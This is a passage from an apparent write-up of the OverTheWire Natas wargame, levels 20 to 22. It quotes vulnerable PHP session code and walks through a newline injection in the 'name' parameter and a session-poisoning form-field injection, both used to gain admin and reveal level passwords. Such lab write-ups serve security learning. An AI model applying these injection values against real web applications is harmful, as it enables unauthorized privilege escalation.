</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Session file doesn&#39;t exist&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Reading from &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$_SESSION</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Read [</span><span class="si">$line</span><span class="s2">]&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="nb">session_encode</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">mywrite</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// $data contains the serialized version of $_SESSION</span>
</span><span class='line'>    <span class="c1">// but our encoding is better</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;MYWRITE </span><span class="si">$sid</span><span class="s2"> </span><span class="si">$data</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="c1">// make sure the sid is alnum only!!</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">strspn</span><span class="p">(</span><span class="nv">$sid</span><span class="p">,</span> <span class="s2">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$sid</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Invalid SID&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">session_save_path</span><span class="p">()</span> <span class="o">.</span> <span class="s2">&quot;/&quot;</span> <span class="o">.</span> <span class="s2">&quot;mysess_&quot;</span> <span class="o">.</span> <span class="nv">$sid</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$data</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Saving in &quot;</span><span class="o">.</span> <span class="nv">$filename</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">ksort</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">chmod</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="mo">0600</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">mydestroy</span><span class="p">(</span><span class="nv">$sid</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYDESTROY $sid&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cm">/* we don&#39;t need this */</span>
</span><span class='line'><span class="k">function</span> <span class="nf">mygarbage</span><span class="p">(</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">//debug(&quot;MYGARBAGE $t&quot;); </span>
</span><span class='line'>    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_set_save_handler</span><span class="p">(</span>
</span><span class='line'>    <span class="s2">&quot;myopen&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myclose&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;myread&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mywrite&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mydestroy&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="s2">&quot;mygarbage&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'>    <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;Name set to &quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$name</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>This is similar to the previous challenges, we still need the $_SESSION array to contain a key named <em>admin</em> with the value of 1. The code writes the session data to a file and that is where it will read the session ID from (the name of the file is the session ID). First, let&rsquo;s look at the debug output when we change our name: <a href="http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug">http://natas20.natas.labs.overthewire.org/index.php?name=admin&amp;debug</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1 // debug("MYREAD $sid"); 
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Reading from ". $filename);
</span><span class='line'>DEBUG: Read [name admin] // debug("Read [$line]");
</span><span class='line'>DEBUG: Read [] // debug("Read [$line]");
</span><span class='line'>DEBUG: Name set to admin // debug("Name set to " . $_REQUEST["name"]);
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:5:"admin"; // debug("MYWRITE $sid $data"); 
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1 // debug("Saving in ". $filename);
</span><span class='line'>DEBUG: name =&gt; admin // debug("$key =&gt; $value");</span></code></pre></td></tr></table></div></figure>


<p>I placed the corresponding PHP code to the same line with the output for convenience. Now to analyze the relevant code:</p>

<ul>
<li><p><strong>function mywrite($sid, $data)</strong> &ndash; after checking that the session ID contains alphanumeric characters only, it sets the path where the session data will be used. The file looks like <em>mysess_SID</em>, see in the output above. Then it sorts the $_SESSION array by its keys and iterates over the array as key => value. In my example, you can see from the output <code>name => admin</code> that <em>name</em> is the key and <em>admin</em> is the value. Then the key and value are written to the file as follows: <code>$data .= &ldquo;$key $value\n&rdquo;;</code>. So the data will look like this: <em>name admin</em> followed by a newline.</p></li>
<li><p><strong>function myread($sid)</strong> &ndash; this function reads the data from the file and breaks the string into an array, split by the delimiter, which in this case is the newline. Then the key and value are separated by a space. Basically, this reads what was written earlier in the file</p></li>
</ul>


<p>We want to focus on the <em>mywrite</em> function because that&rsquo;s the actual code that writes the data that we passed to the server. And the code that needs our attention is this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="nx">debug</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> =&gt; </span><span class="si">$value</span><span class="s2">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="nv">$data</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2"> </span><span class="si">$value</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that to get the password for the next level, the $_SESSION array has to contain a key / value pair of <em>admin => 1</em>. And the <em>mywrite</em> function does the writing of this data for us..so all we need is to find a way to inject it. But if you look at how data is written to the file, you will notice the newline delimiter&hellip;what if we can inject another key / value pair after our initial input? We currently have this: <em>name => admin</em> by entering <em>admin</em> in the form. But if we add a newline character we can then insert a new key / value pair that matches the expectations of the server in order to give us the password. So what we want to inject is <code>admin\nadmin 1</code>. And then the session data would look like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>name admin
</span><span class='line'>admin 1</span></code></pre></td></tr></table></div></figure>


<p>Since we need to URL encode the carriage return and space, the injection looks like this: <code>admin%0dadmin%201</code>. So I passed it to the URL like this: natas20.natas.labs.overthewire.org/index.php?debug&amp;name=admin%0Aadmin%201 and here&rsquo;s the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>DEBUG: MYREAD sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Reading from /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: Read [name admin]
</span><span class='line'>DEBUG: Read [admin 1]
</span><span class='line'>DEBUG: Read []
</span><span class='line'>DEBUG: Name set to admin admin 1
</span><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas21
</span><span class='line'>Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
</span><span class='line'>
</span><span class='line'>DEBUG: MYWRITE sjj8g13u1f3ueiogqdfgf3jin1 name|s:13:"admin admin 1";admin|s:1:"1";
</span><span class='line'>DEBUG: Saving in /var/lib/php5/mysess_sjj8g13u1f3ueiogqdfgf3jin1
</span><span class='line'>DEBUG: admin =&gt; 1
</span><span class='line'>DEBUG: name =&gt; admin admin 1</span></code></pre></td></tr></table></div></figure>


<p>And we successfully acquired the next password: <code>IFekPyrQXftziDEsUr3x21sYuahypdgJ</code></p>

<h3>Level 21</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas21.png" title="natas21" alt="natas 21"></p>

<p>We need to satisfy the same requirements as before to get next password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">print_credentials</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas22</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="nx">print_credentials</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas21css.png" title="natas21css" alt="natas 21css"></p>

<p>This page allows you to play with some CSS values. Also the session ID for this page is different than the other one.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;[DEBUG] Session contents:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nb">print_r</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// only allow these keys</span>
</span><span class='line'><span class="nv">$validkeys</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;align&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;center&quot;</span><span class="p">,</span> <span class="s2">&quot;fontsize&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;100%&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;yellow&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="k">foreach</span><span class="p">(</span><span class="nv">$validkeys</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$defval</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$defval</span><span class="p">;</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$val</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">];</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="nv">$form</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="si">$key</span><span class="s2">: &lt;input name=&#39;</span><span class="si">$key</span><span class="s2">&#39; value=&#39;</span><span class="si">$val</span><span class="s2">&#39; /&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$form</span> <span class="o">.=</span> <span class="s1">&#39;&lt;/form&gt;&#39;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$style</span> <span class="o">=</span> <span class="s2">&quot;background-color: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;bgcolor&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; text-align: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;align&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;; font-size: &quot;</span><span class="o">.</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;fontsize&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$example</span> <span class="o">=</span> <span class="s2">&quot;&lt;div style=&#39;</span><span class="si">$style</span><span class="s2">&#39;&gt;Hello world!&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


<p>If you turn on debug, you can see the contents of the $_SESSION array:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[DEBUG] Session contents:
</span><span class='line'>Array ( [align] =&gt; center [fontsize] =&gt; 100% [bgcolor] =&gt; blue [submit] =&gt; Update ) </span></code></pre></td></tr></table></div></figure>


<p>Again we want to insert the pair <em>admin => 1</em> in the array, but the code only allows those 3 keys, so we can&rsquo;t POST what we want. But if we look at this code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="c1">// if update was submitted, store it</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;submit&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As long as the key <em>submit</em> exists in the $<em>REQUEST array, it will take the key / value pairs in the $</em>REQUEST array and set them in the $_SESSION array. This is exactly what we want! But we can&rsquo;t POST our values because of the validity checks. Reading through the PHP manual I saw this:</p>

<blockquote><p>$<em>REQUEST — An associative array that by default contains the contents of $</em>GET, $<em>POST and $</em>COOKIE.</p>

<p>The variables in $_REQUEST are provided to the script via the GET, POST, and COOKIE input mechanisms and therefore could be modified by the remote
user and cannot be trusted.</p></blockquote>

<p>Well, we have control of what gets passed to $_REQUEST, and the code inserts whatever we give it as long as the key <em>submit</em> exists. Instead of POST&#8217;ing, I modified the HTML using Firebug to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>bgcolor:
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="na">name=</span><span class="s">&quot;admin&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>On the CSS page a new session ID was issued: <code>4nhuf71ckmm80osqvn1s8s8bd6</code>. I pasted it in the session ID of the page that should give us credentials and refreshed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You are an admin. The credentials for the next level are:
</span><span class='line'>
</span><span class='line'>Username: natas22
</span><span class='line'>Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span></code></pre></td></tr></table></div></figure>


<h3>Level 22</h3>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/natas22.png" title="natas22" alt="natas 22"></p>

<p>Pretty blank, eh? Let&rsquo;s look at the code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// only admins can reveal the password</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$_SESSION</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">)</span> <span class="k">and</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&quot;admin&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location: /&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span><span class='line'>
</span><span class='line'><span class="cp">&lt;?</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;revelio&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;&lt;pre&gt;Username: natas23</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="k">print</span> <span class="s2">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"> </span>
</span></code></pre></td></tr></table></div></figure>


